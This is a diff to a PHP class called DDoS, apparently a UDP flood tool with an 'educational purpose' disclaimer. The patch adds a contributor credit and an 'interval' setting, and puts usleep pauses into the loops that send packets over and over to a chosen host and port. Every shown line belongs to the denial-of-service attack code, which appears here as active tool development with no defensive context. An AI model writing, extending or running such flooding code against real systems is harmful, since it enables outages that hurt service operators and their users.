@@ -10,6 +10,7 @@
  * @author TheZer0
  * @author Smaury
  * @author moty66  
+ * @author AxissXs
  * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2 
  * 
  * This tool is written on educational purpose, please use it on your own good faith.
@@ -86,7 +87,8 @@ class DDoS {
 			'bytes' =>	'',
 			'verbose'=> DDOS_LOG_INFO,
 			'format'=> 'text',
-			'output'=> ''
+			'output'=> '',
+			'interval'=>'1'
 	);
 	
 	
@@ -209,6 +211,7 @@ class DDoS {
 				$packets++;
 				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
 				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
+				usleep($this->get_param('interval') * 100);
 			}
 			$timeStr = $exec_time. ' second';
 			if(1 != $exec_time) {
@@ -224,6 +227,7 @@ class DDoS {
 				$packets++;
 				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
 				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
+				usleep($this->get_param('interval') * 100);
 			}
 			$exec_time = time() - $start_time;
 		
